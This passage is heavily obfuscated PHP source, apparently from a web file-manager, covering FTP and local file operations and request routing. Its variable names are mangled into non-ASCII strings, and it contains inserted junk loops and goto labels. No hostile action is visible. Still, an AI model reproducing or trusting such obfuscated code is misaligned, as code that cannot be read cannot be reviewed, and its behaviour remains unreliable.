ftp_nb_put($this->connect, $˜ŞÂŸ£¾, $„Ø„Â´“, FTP_BINARY); while ($„¼Øäğƒ == FTP_MOREDATA) { $„¼Øäğƒ = ftp_nb_continue($this->connect); } if ($„¼Øäğƒ != FTP_FINISHED) { return !1; } return $this->getPathOuter($˜ŞÂŸ£¾); } public function download($ùò¢›ã¸, $ü±àóÛ€ = '') { if (!$this->_isconn()) { return !1; } $‘¢¥şÎ = $this->pathFather($ü±àóÛ€); if (!IO::mkdir($‘¢¥şÎ)) { return !1; } $ùò¢›ã¸ = $this->iconvSystem($ùò¢›ã¸); $ü±àóÛ€ = $this->iconvSystem($ü±àóÛ€); $ë¸Âó€à = ftp_nb_get($this->connect, $ü±àóÛ€, $ùò¢›ã¸, FTP_BINARY); while ($ë¸Âó€à == FTP_MOREDATA) { $ë¸Âó€à = ftp_nb_continue($this->connect); } if ($ë¸Âó€à != FTP_FINISHED) { return !1; } return $this->iconvApp($ü±àóÛ€); } public function exist($Ö¾ä½Â…) { return $this->isFile($Ö¾ä½Â…) || $this->isFolder($Ö¾ä½Â…); } public function isFile($´é«¤í) { return !$this->isFolder($´é«¤í) && $this->objectMeta($´é«¤í); } public function isFolder($ª÷Éû®º) { return $this->cacheMethod($_SERVER[íû‘ş´][166], $ª÷Éû®º); } protected function objectMeta($ÏÖĞ Ä÷) { return $this->cacheMethod($_SERVER[íû‘ş´][168], $ÏÖĞ Ä÷); } protected function _objectMeta($²³­Ê™) { $¯©—¤¨‚ =& $_SERVER[íû‘ş´]; if ($²³­Ê™ == $¯©—¤¨‚[12] || $²³­Ê™ == $¯©—¤¨‚[8]) { return array(); } if (!$this->_isconn()) { return !1; } $²³­Ê™ = $this->iconvSystem($²³­Ê™); $ÉÔË¯ÂÈ = array($¯©—¤¨‚[32] => $this->iconvApp($²³­Ê™), $¯©—¤¨‚[33] => $¯©—¤¨‚[214], $¯©—¤¨‚[76] => 0); @ftp_chdir($this->connect, $¯©—¤¨‚[8]); $œ…»Ø = @ftp_size($this->connect, $²³­Ê™); if ($œ…»Ø != -1) { $ÉÔË¯ÂÈ[$¯©—¤¨‚[76]] = $œ…»Ø; } else { $ùá’›·° = @ftp_chdir($this->connect, $²³­Ê™); if (!$ùá’›·°) { return !1; } $ÉÔË¯ÂÈ[$¯©—¤¨‚[33]] = $¯©—¤¨‚[75]; } return $ÉÔË¯ÂÈ; } protected function _isFolder($½ªÔ€ù ) { $Ü•‰ÅáÉ =& $_SERVER[íû‘ş´]; if ($½ªÔ€ù  == $Ü•‰ÅáÉ[12] || $½ªÔ€ù  == $Ü•‰ÅáÉ[8]) { return !0; } $ïÃŠ²˜Å = $this->_objectMeta($½ªÔ€ù ); return isset($ïÃŠ²˜Å[$Ü•‰ÅáÉ[33]]) && $ïÃŠ²˜Å[$Ü•‰ÅáÉ[33]] == $Ü•‰ÅáÉ[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¼½óÁ‡Ş) { if (substr($¼½óÁ‡Ş, 0, 2) == $_SERVER[íû‘ş´][1411]) { $¼½óÁ‡Ş = BASIC_PATH . substr($¼½óÁ‡Ş, 2); } return $¼½óÁ‡Ş; } public function iconvApp($ïõ¸Ğ‹) { $·Ü£˜÷ =& $_SERVER[íû‘ş´]; global $config; return $this->iconvTo($ïõ¸Ğ‹, $config[$·Ü£˜÷[1409]], $config[$·Ü£˜÷[1408]]); } public function iconvSystem($·¡£á­Ù) { $¡«„é¢É =& $_SERVER[íû‘ş´]; global $config; return $this->iconvTo($·¡£á­Ù, $config[$¡«„é¢É[1408]], $config[$¡«„é¢É[1409]]); } public function getPathOuter($î…¦¬¼Ô) { $áÍšñËÇ =& $_SERVER[íû‘ş´]; $íí‹½ËÁ = $this->iconvApp($this->pathBase); $î…¦¬¼Ô = $this->iconvApp($î…¦¬¼Ô); if (substr($íí‹½ËÁ, 0, 2) == $áÍšñËÇ[1411]) { $íí‹½ËÁ = BASIC_PATH . substr($íí‹½ËÁ, 2); } if (substr($î…¦¬¼Ô, 0, 2) == $áÍšñËÇ[1411]) { $î…¦¬¼Ô = BASIC_PATH . substr($î…¦¬¼Ô, 2); } $íí‹½ËÁ = KodIO::clear($íí‹½ËÁ); $î…¦¬¼Ô = KodIO::clear($î…¦¬¼Ô); $î…¦¬¼Ô = substr($î…¦¬¼Ô, strlen($íí‹½ËÁ)); if (empty($this->pathDriver)) { return $î…¦¬¼Ô; } return $this->pathDriver . $áÍšñËÇ[8] . ltrim($î…¦¬¼Ô, $áÍšñËÇ[8]); } public function mkfile($ŒÂ¤¸È´, $·ôĞÄ¨ = '', $†ÈøŠÇë = REPEAT_RENAME) { $ŒÂ¤¸È´ = $this->iconvSystem($ŒÂ¤¸È´); @touch($ŒÂ¤¸È´); if ($·ôĞÄ¨) { file_put_contents($ŒÂ¤¸È´, $·ôĞÄ¨); } @chmod($ŒÂ¤¸È´, $this->pathAuth); return is_file($ŒÂ¤¸È´) ? $this->getPathOuter($ŒÂ¤¸È´) : !1; } public function mkdir($İ‰ß¸ó‘, $ñÔ¨¯¥œ = REPEAT_SKIP) { $İ‰ß¸ó‘ = $this->iconvSystem($İ‰ß¸ó‘); if (is_dir($İ‰ß¸ó‘)) { return $this->getPathOuter($İ‰ß¸ó‘); } @mkdir($İ‰ß¸ó‘, $this->pathAuth, !0); @chmod($İ‰ß¸ó‘, $this->pathAuth); return is_dir($İ‰ß¸ó‘) ? $this->getPathOuter($İ‰ß¸ó‘) : !1; } public function copyFile($‰„Ö½ÅÄ, $Éı£˜ç€) { $this->mkdir($this->pathFather($Éı£˜ç€)); $‰„Ö½ÅÄ = $this->iconvSystem($‰„Ö½ÅÄ); $Éı£˜ç€ = $this->iconvSystem($Éı£˜ç€); $ ¬ëÚÌ = copy_64($‰„Ö½ÅÄ, $Éı£˜ç€); @chmod($Éı£˜ç€, $this->pathAuth); return $ ¬ëÚÌ ? $this->getPathOuter($Éı£˜ç€) : !1; } public function moveFile($ÂñÆ·Øé, $È‰®à„í) { $this->mkdir($this->pathFather($È‰®à„í)); $ÂñÆ·Øé = $this->iconvSystem($ÂñÆ·Øé); $È‰®à„í = $this->iconvSystem($È‰®à„í); $­ó‚‹€Û = intval(@rename($ÂñÆ·Øé, $È‰®à„í)); if (!$­ó‚‹€Û) { if ($­ó‚‹€Û = intval(@copy_64($ÂñÆ·Øé, $È‰®à„í))) { @unlink($ÂñÆ·Øé); } } @chmod($È‰®à„í, $this->pathAuth); return $­ó‚‹€Û ? $this->getPathOuter($È‰®à„í) : !1; } public function movePath($…¦¿›á•, $¡˜¡œ¢È, $šË°ãÛş = false) { $ã¼ƒÛÃ =& $_SERVER[íû‘ş´]; $…¦¿›á• = $this->iconvSystem($…¦¿›á•); $¡˜¡œ¢È = $this->iconvSystem($¡˜¡œ¢È); $—“Ó®Ìê = rtrim($¡˜¡œ¢È, $ã¼ƒÛÃ[8]) . $ã¼ƒÛÃ[8] . ($šË°ãÛş ? $šË°ãÛş : get_path_this($…¦¿›á•)); if (file_exists($—“Ó®Ìê)) { return !1; } $‘ê«õŠø = intval(@rename($…¦¿›á•, $—“Ó®Ìê)); $‘ê«õŠø = file_exists($—“Ó®Ìê); return $‘ê«õŠø ? $this->getPathOuter($—“Ó®Ìê) : !1; } public function delFile($¥úšäã˜) { $¥úšäã˜ = $this->iconvSystem($¥úšäã˜); if (!@unlink($¥úšäã˜)) { @chmod($¥úšäã˜, $this->pathAuth); if (!@unlink($¥úšäã˜)) { return !1; } } else { return !0; } } public function delFolder($¼–€Ô™Õ) { $¦œÊ¶ğÆ =& $_SERVER[íû‘ş´]; $¼–€Ô™Õ = $this->iconvSystem($¼–€Ô™Õ); if (!is_dir($¼–€Ô™Õ)) { return !0; } if (!($ò—³Òü¹ = opendir($¼–€Ô™Õ))) { return !1; } while (($¥¸ÄÉ¬ñ = readdir($ò—³Òü¹)) !== !1) { if ($¥¸ÄÉ¬ñ == $¦œÊ¶ğÆ[10] || $¥¸ÄÉ¬ñ == $¦œÊ¶ğÆ[1336]) { continue; } $Áƒİïê = $¼–€Ô™Õ . $¦œÊ¶ğÆ[8] . $¥¸ÄÉ¬ñ; if (is_file($Áƒİïê) || is_link($Áƒİïê)) { if (!unlink($Áƒİïê)) { chmod($Áƒİïê, $this->pathAuth); if (!unlink($Áƒİïê)) { return !1; } } } else { if (is_dir($Áƒİïê)) { chmod($Áƒİïê, $this->pathAuth); $Áƒİïê = $this->iconvApp($Áƒİïê); if (!$this->delFolder($Áƒİïê)) { return !1; } } } } closedir($ò—³Òü¹); return rmdir($¼–€Ô™Õ); } public function rename($è‹ğƒîî, $Úß÷¡¥) { $•Ø‰³²¾ =& $_SERVER[íû‘ş´]; $ûÂŞüÅé = $this->fileNameAuto($this->pathFather($è‹ğƒîî), $Úß÷¡¥); $ûÂŞüÅé = $this->iconvSystem($ûÂŞüÅé); $è‹ğƒîî = $this->iconvSystem($è‹ğƒîî); $ü…Ì¢åà = $this->pathFather($è‹ğƒîî); $´ĞšÅç = rtrim($ü…Ì¢åà, $•Ø‰³²¾[8]) . $•Ø‰³²¾[8] . $ûÂŞüÅé; $×È¾•­î = @rename($è‹ğƒîî, $´ĞšÅç); $´ĞšÅç = $this->iconvApp($´ĞšÅç); return $×È¾•­î ? $this->getPathOuter($´ĞšÅç) : !1; } public function size($Ò®ò¥ù±) { $Ò®ò¥ù± = $this->iconvSystem($Ò®ò¥ù±); return filesize_64($Ò®ò¥ù±); } public function info($ÌëÕ ö) { $ÌëÕ ö = $this->iconvSystem($ÌëÕ ö); if ($this->isFolder($ÌëÕ ö)) { return $this->folderInfo($ÌëÕ ö); } else { if ($this->isFile($ÌëÕ ö)) { return $this->fileInfo($ÌëÕ ö); } } return !1; } protected function infoChildren($©‰©ÃÑ, &$ÒÒÂ¦˜Î, $ÀÌø çâ = true) { $›÷Õğ¸ƒ =& $_SERVER[íû‘ş´]; check_abort_echo(); $©‰©ÃÑ = rtrim($©‰©ÃÑ, $›÷Õğ¸ƒ[8]) . $›÷Õğ¸ƒ[8]; if ($ÀÌø çâ) { $©‰©ÃÑ = $this->iconvSystem($©‰©ÃÑ); } if (!($ûïúˆÆâ = @opendir($©‰©ÃÑ))) { return; } while (($ŞØôÕ»³ = readdir($ûïúˆÆâ)) !== !1) { if ($ŞØôÕ»³ == $›÷Õğ¸ƒ[10] || $ŞØôÕ»³ == $›÷Õğ¸ƒ[1336]) { continue; } $©ßÕ³„ = $©‰©ÃÑ . $ŞØôÕ»³; if (is_file($©ßÕ³„) || is_link($©ßÕ³„)) { $ÒÒÂ¦˜Î[$›÷Õğ¸ƒ[77]]++; $ÒÒÂ¦˜Î[$›÷Õğ¸ƒ[76]] += filesize_64($©ßÕ³„); } else { if (is_dir($©ßÕ³„)) { $ÒÒÂ¦˜Î[$›÷Õğ¸ƒ[78]]++; $this->infoChildren($©ßÕ³„, $ÒÒÂ¦˜Î, !1); } } } closedir($ûïúˆÆâ); } private function folderInfo($Ò…¶Úü, $…É®ÚäØ = false) { $ñ¸Ä€ÌÇ =& $_SERVER[íû‘ş´]; $Ò…¶Úü = rtrim($Ò…¶Úü, $ñ¸Ä€ÌÇ[8]) . $ñ¸Ä€ÌÇ[8]; $ŞõıŞË = $this->iconvApp($this->pathThis($Ò…¶Úü)); if ($…É®ÚäØ) { return array($ñ¸Ä€ÌÇ[32] => $ŞõıŞË, $ñ¸Ä€ÌÇ[84] => $this->getPathOuter($Ò…¶Úü), $ñ¸Ä€ÌÇ[33] => $ñ¸Ä€ÌÇ[75]); } $ˆöš¾ = array($ñ¸Ä€ÌÇ[32] => $ŞõıŞË, $ñ¸Ä€ÌÇ[84] => $this->getPathOuter($Ò…¶Úü), $ñ¸Ä€ÌÇ[33] => $ñ¸Ä€ÌÇ[75], $ñ¸Ä€ÌÇ[215] => @filectime($Ò…¶Úü), $ñ¸Ä€ÌÇ[85] => @filemtime($Ò…¶Úü), $ñ¸Ä€ÌÇ[1420] => @fileatime($Ò…¶Úü), $ñ¸Ä€ÌÇ[1421] => is_readable($Ò…¶Úü), $ñ¸Ä€ÌÇ[1422] => is_writable($Ò…¶Úü), $ñ¸Ä€ÌÇ[1423] => get_mode($Ò…¶Úü)); return $ˆöš¾; } private function fileInfo($¡òÌĞˆá, $õ¬à¸ã§ = false) { $‡øééÊÇ =& $_SERVER[íû‘ş´]; $îÌõªüõ = $this->iconvApp($this->pathThis($¡òÌĞˆá)); if ($õ¬à¸ã§) { return array($‡øééÊÇ[32] => $îÌõªüõ, $‡øééÊÇ[84] => $this->getPathOuter($¡òÌĞˆá), $‡øééÊÇ[33] => $‡øééÊÇ[214], $‡øééÊÇ[76] => $this->size($¡òÌĞˆá), $‡øééÊÇ[175] => $this->ext($îÌõªüõ)); } $©ÈŒ’÷ò = array($‡øééÊÇ[32] => $îÌõªüõ, $‡øééÊÇ[84] => $this->getPathOuter($¡òÌĞˆá), $‡øééÊÇ[33] => $‡øééÊÇ[214], $‡øééÊÇ[215] => @filectime($¡òÌĞˆá), $‡øééÊÇ[85] => @filemtime($¡òÌĞˆá), $‡øééÊÇ[1420] => @fileatime($¡òÌĞˆá), $‡øééÊÇ[76] => $this->size($¡òÌĞˆá), $‡øééÊÇ[175] => $this->ext($îÌõªüõ), $‡øééÊÇ[1421] => is_readable($¡òÌĞˆá), $‡øééÊÇ[1422] => is_writable($¡òÌĞˆá), $‡øééÊÇ[1423] => get_mode($¡òÌĞˆá)); return $©ÈŒ’÷ò; } public function exist($¨øÜˆÓş) { $¨øÜˆÓş = $this->iconvSystem($¨øÜˆÓş); return @file_exists($¨øÜˆÓş); } public function isFile($Óêá™â) { $Óêá™â = $this->iconvSystem($Óêá™â); return @is_file($Óêá™â); } public function isFolder($Ü¬í÷ğÕ) { $Ü¬í÷ğÕ = $this->iconvSystem($Ü¬í÷ğÕ); return @is_dir($Ü¬í÷ğÕ); } public function listPath($­Œ€Ãş…, $ÎœÈºâì = false) { $–‹©Ÿ¥­ =& $_SERVER[íû‘ş´]; $­Œ€Ãş… = $this->iconvSystem($­Œ€Ãş…); $­Œ€Ãş… = rtrim($­Œ€Ãş…, $–‹©Ÿ¥­[8]) . $–‹©Ÿ¥­[8]; $Ò¾· = array($–‹©Ÿ¥­[82] => array(), $–‹©Ÿ¥­[83] => array()); if (!($½ü‰Ì›ù = @opendir($­Œ€Ãş…))) { return $Ò¾·; } while (($ÃÓÍï°¨ = readdir($½ü‰Ì›ù)) !== !1) { if ($ÃÓÍï°¨ == $–‹©Ÿ¥­[10] || $ÃÓÍï°¨ == $–‹©Ÿ¥­[1336]) { continue; } $‹“çİ¯– = $­Œ€Ãş… . $ÃÓÍï°¨; if (is_file($‹“çİ¯–)) { $Ò¾·[$–‹©Ÿ¥­[83]][] = $this->fileInfo($‹“çİ¯–, $ÎœÈºâì); } else { $Ò¾·[$–‹©Ÿ¥­[82]][] = $this->folderInfo($‹“çİ¯–, $ÎœÈºâì); } } closedir($½ü‰Ì›ù); return $Ò¾·; } public function listAll($«´êèÜ, &$™Ì‰ÔÌù = array()) { $£•îñÜõ =& $_SERVER[íû‘ş´]; $«´êèÜ = $this->iconvSystem($«´êèÜ); $«´êèÜ = rtrim($«´êèÜ, $£•îñÜõ[8]) . $£•îñÜõ[8]; if (!($¹›ÜÆ£‘ = @opendir($«´êèÜ))) { return $™Ì‰ÔÌù; } while (($ÚÇ˜±‰ = readdir($¹›ÜÆ£‘)) !== !1) { if ($ÚÇ˜±‰ == $£•îñÜõ[10] || $ÚÇ˜±‰ == $£•îñÜõ[1336]) { continue; } $ı‹óÈò´ = $«´êèÜ . $ÚÇ˜±‰; $¸İçÃùğ = is_dir($ı‹óÈò´) && !is_link($ı‹óÈò´) ? 1 : 0; $ı‹óÈò´ = $¸İçÃùğ ? $ı‹óÈò´ . $£•îñÜõ[8] : $ı‹óÈò´; $™Ì‰ÔÌù[] = array($£•îñÜõ[84] => $ı‹óÈò´, $£•îñÜõ[75] => $¸İçÃùğ, $£•îñÜõ[85] => intval(@filemtime($ı‹óÈò´)), $£•îñÜõ[76] => $¸İçÃùğ ? 0 : intval($this->size($ı‹óÈò´))); if ($¸İçÃùğ) { $this->listAll($ı‹óÈò´, $™Ì‰ÔÌù); } } closedir($¹›ÜÆ£‘); return $™Ì‰ÔÌù; } public function has($ş©ñ¯šó, $¢şÛõ¼¬ = false, $Š©Íá†¶ = true) { $Í¼ğŸæ =& $_SERVER[íû‘ş´]; $ş©ñ¯šó = $this->iconvSystem($ş©ñ¯šó); $ş©ñ¯šó = rtrim($ş©ñ¯šó, $Í¼ğŸæ[8]) . $Í¼ğŸæ[8]; if (!($¯ó§Ü¼¨ = @opendir($ş©ñ¯šó))) { return !1; } $“©å‹® = 0; $ÊÍŞ”®¦ = 0; $ãáÒ’– = 0; while (($úŞ„›‘¶ = readdir($¯ó§Ü¼¨)) !== !1) { if ($úŞ„›‘¶ == $Í¼ğŸæ[10] || $úŞ„›‘¶ == $Í¼ğŸæ[1336]) { continue; } $Á­º”›Ò = $ş©ñ¯šó . $úŞ„›‘¶; if ($¢şÛõ¼¬) { $ãáÒ’–++; if (@is_file($Á­º”›Ò)) { $“©å‹®++; } else { $ÊÍŞ”®¦++; } if ($ãáÒ’– > 10000) { break; } continue; } if ($Š©Íá†¶) { if (@is_file($Á­º”›Ò)) { return !0; } } else { if (@is_dir($Á­º”›Ò . $Í¼ğŸæ[8])) { return !0; } } } closedir($¯ó§Ü¼¨); if ($¢şÛõ¼¬) { return array($Í¼ğŸæ[223] => $“©å‹®, $Í¼ğŸæ[224] => $ÊÍŞ”®¦); } return !1; } public function hashSimple($š³Ä —ë) { $ùÈÃ¤® =& $_SERVER[íû‘ş´]; if (!$š³Ä —ë) { return md5($ùÈÃ¤®[12]); } $š³Ä —ë = $this->iconvSystem($š³Ä —ë); $Ñ»å½ğ¥ = $this->size($š³Ä —ë); $ò¹¸ºëº = 200; $‰¡ªôñÍ = 50; if ($Ñ»å½ğ¥ <= $ò¹¸ºëº * $‰¡ªôñÍ) { return $this->hashMd5($š³Ä —ë) . $Ñ»å½ğ¥; } $½‹ÓüëŞ = $ùÈÃ¤®[12]; $å÷€™£ø = intval($Ñ»å½ğ¥ / $‰¡ªôñÍ); $©÷çı…¤ = fopen($š³Ä —ë, $ùÈÃ¤®[1424]); if (!$©÷çı…¤) { return $½‹ÓüëŞ; } for ($à›Àéš¸ = 0; $à›Àéš¸ < $‰¡ªôñÍ; $à›Àéš¸++) { fseek_64($©÷çı…¤, $å÷€™£ø * $à›Àéš¸); $½‹ÓüëŞ .= fread($©÷çı…¤, $ò¹¸ºëº); } fseek_64($©÷çı…¤, $Ñ»å½ğ¥ - $ò¹¸ºëº); $½‹ÓüëŞ .= fread($©÷çı…¤, $ò¹¸ºëº); fclose($©÷çı…¤); return md5($½‹ÓüëŞ) . $Ñ»å½ğ¥; } public function getContent($Æûò£¥) { $Æûò£¥ = $this->iconvSystem($Æûò£¥); return file_get_contents($Æûò£¥); } public function setContent($ã‹¨Äíü, $Å©ÂŞ¼‡ = '') { $ã‹¨Äíü = $this->iconvSystem($ã‹¨Äíü); $¹û…… = @file_put_contents($ã‹¨Äíü, $Å©ÂŞ¼‡, LOCK_EX); clearstatcache(); @chmod($ã‹¨Äíü, $this->pathAuth); return $¹û…… === !1 ? !1 : !0; } public function fileSubstr($‰¢ü©ôÉ, $ÑÅö¨«¡ = 0, $ÂŸ¨ö‡ì = false) { $Å”ÚÄåØ =& $_SERVER[íû‘ş´]; $‰¢ü©ôÉ = $this->iconvSystem($‰¢ü©ôÉ); if ($ÂŸ¨ö‡ì === !1) { $ÂŸ¨ö‡ì = $this->size($‰¢ü©ôÉ); } if ($ÂŸ¨ö‡ì <= 0) { return $Å”ÚÄåØ[12]; } $¼ëæÜ†· = fopen($‰¢ü©ôÉ, $Å”ÚÄåØ[1424]); if (!$¼ëæÜ†·) { return !1; } fseek_64($¼ëæÜ†·, $ÑÅö¨«¡); $÷ÉÕ¨•Î = fread($¼ëæÜ†·, $ÂŸ¨ö‡ì); fclose($¼ëæÜ†·); return $÷ÉÕ¨•Î; } public function upload($ÈÒÑ¾ş„, $ş¦ŞŸîµ, $Êå°é´£ = false, $ÃƒšûÎÁ = REPEAT_REPLACE) { if ($Êå°é´£) { return $this->moveFile($ş¦ŞŸîµ, $ÈÒÑ¾ş„); } return $this->copyFile($ş¦ŞŸîµ, $ÈÒÑ¾ş„); } public function setModifyTime($é‡şß£”, $¡ÑÀÂí¤ = '') { @touch($é‡şß£”, intval($¡ÑÀÂí¤)); } public function download($ƒÒõ’îÅ, $“©¸ÒƒÚ) { return $this->iconvSystem($ƒÒõ’îÅ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¬¬Ï£œø) { parent::__construct($¬¬Ï£œø); $this->signatureVersion($_SERVER[íû‘ş´][231]); } public function fileOutLink($ÒÙ¸Ø) { $¬Ÿ¢¸òÏ =& $_SERVER[íû‘ş´]; if (substr($ÒÙ¸Ø, 0, 7) == $¬Ÿ¢¸òÏ[1388]) { $ÒÙ¸Ø = $¬Ÿ¢¸òÏ[1389] . substr($ÒÙ¸Ø, 7); } header($¬Ÿ¢¸òÏ[162] . $ÒÙ¸Ø); die; } } goto e«ÀÖÆµ‘; C¼ËèÛŒÉ: if (!$izylfohcqv) { return; } class Application { private $defaultModule = "\151\156\144\x65\170"; private $defaultController = "\151\156\x64\x65\170"; private $defaultAction = "\151\156\x64\145\x78"; function __construct() { } public function setDefault($ÁÂß·â¢) { $œàãïô =& $_SERVER[íû‘ş´]; $îÑ¾Ÿ·… =& $_SERVER[¹£Ÿ×Òˆ]; $ ®ÚÉ±µ = explode($îÑ¾Ÿ·…[0], trim($ÁÂß·â¢, $îÑ¾Ÿ·…[0])); $this->defaultModule = $ ®ÚÉ±µ[0] ? $ ®ÚÉ±µ[0] : $this->defaultModule; $this->defaultController = $ ®ÚÉ±µ[1] ? $ ®ÚÉ±µ[1] : $this->defaultController; $this->defaultAction = $ ®ÚÉ±µ[2] ? $ ®ÚÉ±µ[2] : $this->defaultAction; $£‘÷†‰Í = $œàãïô[661]; if (strlen($£‘÷†‰Í) < $œàãïô[662]) { return; } $this->onke012d3c17($îÑ¾Ÿ·…[1], array($this, $îÑ¾Ÿ·…[2])); $¤ùÒóôÔ = $œàãïô[663]; while (strlen($¤ùÒóôÔ) < $œàãïô[449]) { if (!$¤ùÒóôÔ) { break; } $¤ùÒóôÔ++; } } public function appRun($Ú“ßå¿¬) { $¹ö’æ¬à =& $_SERVER[íû‘ş´]; $ù®ú©¨ =& $_SERVER[¹£Ÿ×Òˆ]; $™’ùç© = explode($ù®ú©¨[0], $Ú“ßå¿¬); $Ï¹†œÆ¨ = $¹ö’æ¬à[664]; if (strlen($Ï¹†œÆ¨) < $¹ö’æ¬à[665]) { die; } $ÏÒÍÙª÷ = strtolower($™’ùç©[0]); $å¯îìŸö = $ù®ú©¨[3]; $’‘ı†– = $¹ö’æ¬à[666]; if (strlen($’‘ı†–) < $¹ö’æ¬à[667]) { return; } if ($ÏÒÍÙª÷ == $ù®ú©¨[4]) { $å¯îìŸö = $ù®ú©¨[5]; $™’ùç©[0] = $ù®ú©¨[6]; $™’ùç©[1] = $™’ùç©[1] . $ù®ú©¨[7]; $Ú“ßå¿¬ = join($ù®ú©¨[0], $™’ùç©); $Ú“ßå¿¬ = trim($Ú“ßå¿¬, $ù®ú©¨[0]); } call_user_func(array($ù®ú©¨[8], $ù®ú©¨[9]), $å¯îìŸö . $ù®ú©¨[10], $Ú“ßå¿¬); ActionCall($Ú“ßå¿¬); $ö„£ã” = $¹ö’æ¬à[668]; if (!$ö„£ã”) { die; } call_user_func(array($ù®ú©¨[8], $ù®ú©¨[9]), $å¯îìŸö . $ù®ú©¨[11], $Ú“ßå¿¬); $°³ÌÎÓÚ = $¹ö’æ¬à[669]; if (strlen($°³ÌÎÓÚ) < $¹ö’æ¬à[667]) { return; } } private function autorun() { $¥‰ì¥ Ì =& $_SERVER[íû‘ş´]; $ê­ôî• =& $_SERVER[¹£Ÿ×Òˆ]; global $config; if (count($config[$ê­ôî•[12]]) == 0) { return; } foreach ($config[$ê­ôî•[12]] as $¡ÜÈ³Ñ† => $êÉøß¢ı) { $this->appRun($êÉøß¢ı); $¦êËô£ˆ = $¥‰ì¥ Ì[670]; if (strlen($¦êËô£ˆ) < $¥‰ì¥ Ì[671]) { return; } } } private function xflh9d1bef86() { $´èÈâ…– =& $_SERVER[íû‘ş´]; $çÃ¯…Ü– =& $_SERVER[¹£Ÿ×Òˆ]; $ü†²…ô = $çÃ¯…Ü–[4]; $û•¾ò² = $GLOBALS[$çÃ¯…Ü–[13]][$çÃ¯…Ü–[14]][0]; $ĞÈêıŞÀ = $´èÈâ…–[672]; if (!$û•¾ò² || strlen($û•¾ò²) <= strlen($ü†²…ô)) { return; } if (strtolower(substr($û•¾ò², -strlen($ü†²…ô))) != $ü†²…ô) { return; } $çèóòÏœ = substr($û•¾ò², 0, -strlen($ü†²…ô)); $ƒä¯ Ô = $´èÈâ…–[673]; if (!$ƒä¯ Ô) { return; } $¨µÁóí³ = array($çÃ¯…Ü–[4], $çèóòÏœ); $Ê°á³Ù = array_slice($GLOBALS[$çÃ¯…Ü–[13]][$çÃ¯…Ü–[14]], 1); $Ò°¶—é× = $´èÈâ…–[674]; while ($Ò°¶—é× < $´èÈâ…–[665]) { if ($Ò°¶—é× >= 0) { break; } $Ò°¶—é×++; } $GLOBALS[$çÃ¯…Ü–[13]][$çÃ¯…Ü–[14]] = array_merge($¨µÁóí³, $Ê°á³Ù); $á¼÷õÖÚ = $´èÈâ…–[675]; $GLOBALS[$çÃ¯…Ü–[13]][$çÃ¯…Ü–[15]] = implode($çÃ¯…Ü–[0], $GLOBALS[$çÃ¯…Ü–[13]][$çÃ¯…Ü–[14]]); $‰ã…­£¬ = $´èÈâ…–[676]; while (strlen($‰ã…­£¬) < $´èÈâ…–[662]) { if (!$‰ã…­£¬) { break; } $‰ã…­£¬++; } } private function nuta19b8dfe7() { $×ùö‡çä =& $_SERVER[íû‘ş´]; $üõ–«² =& $_SERVER[¹£Ÿ×Òˆ]; if ($GLOBALS[$üõ–«²[13]][$üõ–«²[15]] != $üõ–«²[6]) { return; } $‰ìîó¢â = $_SERVER[$üõ–«²[16]]; $·›ú²øæ = $×ùö‡çä[677]; if (strlen($·›ú²øæ) < $×ùö‡çä[449]) { die; } $îí¯¼¥ = $üõ–«²[17]; $šÄ¼÷Ì = $×ùö‡çä[678]; while (strlen($šÄ¼÷Ì) < $×ùö‡çä[662]) { if (!$šÄ¼÷Ì) { break; } $šÄ¼÷Ì++; } if (!strstr($‰ìîó¢â, $îí¯¼¥)) { return; } $ƒÏ„±Ø‚ = strrpos($‰ìîó¢â, $îí¯¼¥); $ûü€”¤Ç = substr($‰ìîó¢â, $ƒÏ„±Ø‚ + strlen($îí¯¼¥)); preg_match_all($üõ–«²[18], $ûü€”¤Ç, $½¤¸¾§ô); $ûü€”¤Ç = trim($½¤¸¾§ô[0][0], $üõ–«²[19]); $ÏÕŒ¯¾… = $×ùö‡çä[679]; if (!$ÏÕŒ¯¾…) { die; } $GLOBALS[$üõ–«²[13]][$üõ–«²[14]] = explode($üõ–«²[19], $ûü€”¤Ç); $ïÑ²á¦Ë = $×ùö‡çä[680]; if (strlen($ïÑ²á¦Ë) < $×ùö‡çä[662]) { die; } $GLOBALS[$üõ–«²[13]][$üõ–«²[15]] = implode($üõ–«²[0], $GLOBALS[$üõ–«²[13]][$üõ–«²[14]]); } public function run() { $î¬‘ë×„ =& $_SERVER[íû‘ş´]; $Òçƒ¨ê =& $_SERVER[¹£Ÿ×Òˆ]; $this->nuta19b8dfe7(); $üó·İÀ÷ = $î¬‘ë×„[681]; $this->xflh9d1bef86(); $êÔ”¸¥ù = $GLOBALS[$Òçƒ¨ê[13]][$Òçƒ¨ê[14]]; $êµ ¤É = $î¬‘ë×„[682]; if (strlen($êµ ¤É) < $î¬‘ë×„[667]) { die; } $Ç¬Ë…†ó = $GLOBALS[$Òçƒ¨ê[13]][$Òçƒ¨ê[15]]; define($Òçƒ¨ê[20], isset($êÔ”¸¥ù[0]) && $êÔ”¸¥ù[0] ? $êÔ”¸¥ù[0] : $this->defaultModule); define($Òçƒ¨ê[21], isset($êÔ”¸¥ù[1]) && $êÔ”¸¥ù[0] ? $êÔ”¸¥ù[1] : $this->defaultController); define($Òçƒ¨ê[22], isset($êÔ”¸¥ù[2]) && $êÔ”¸¥ù[0] ? $êÔ”¸¥ù[2] : $this->defaultAction); define($Òçƒ¨ê[23], MOD . $Òçƒ¨ê[0] . ST . $Òçƒ¨ê[0] . ACT); $ÌŒ•©ºú = $î¬‘ë×„[683]; while (strlen($ÌŒ•©ºú) < $î¬‘ë×„[671]) { if (!$ÌŒ•©ºú) { break; } $ÌŒ•©ºú++; } $_SERVER[$Òçƒ¨ê[24]] = strtolower(ACTION); $this->autorun(); if (count($êÔ”¸¥ù) >= 3) { $this->appRun($Ç¬Ë…†ó); } else { $this->appRun(ACTION); } } private $ydfweedb354d = array(); private $owcj8fea24cd = ''; public function wzrx2253f56f() { $‰¯Ğ•ñØ =& $_SERVER[íû‘ş´]; $æÓÛ–»ı =& $_SERVER[¹£Ÿ×Òˆ]; $this->wpnkbf9b0e35(); $îõåÉ…ğ = $‰¯Ğ•ñØ[684]; if (!$îõåÉ…ğ) { die; } $this->xiku8591785a(); $this->cjdocc2c61c9(); $×É‡õ¯… = $‰¯Ğ•ñØ[685]; if (strlen($×É‡õ¯…) < $‰¯Ğ•ñØ[449]) { die; } 